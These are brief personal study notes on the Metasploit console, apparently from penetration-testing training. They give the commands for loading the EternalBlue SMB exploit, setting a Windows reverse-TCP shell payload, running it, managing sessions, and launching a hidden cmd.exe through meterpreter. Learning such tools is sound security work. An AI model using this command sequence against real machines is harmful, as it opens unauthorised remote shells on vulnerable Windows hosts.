# Metasploit

## Notes

use exploit/windows/smb/ms17_010_eternalblue

show options

info exploit/windows/smb/ms17_010_eternalblue

set payload windows/x64/shell/reverse_tcp

setg command allows you to set the value so it can be used by default across different modules. You can clear any value set with setg using unsetg

exploit = run

You can use the background command to background the session prompt and go back to the msfconsole prompt.
The sessions command can be used from the msfconsole prompt or any context to see the existing sessions.
To interact with any session, you can use the sessions -i command followed by the desired session number.
show payloads

meterpreter> execute -f cmd.exe -i -H


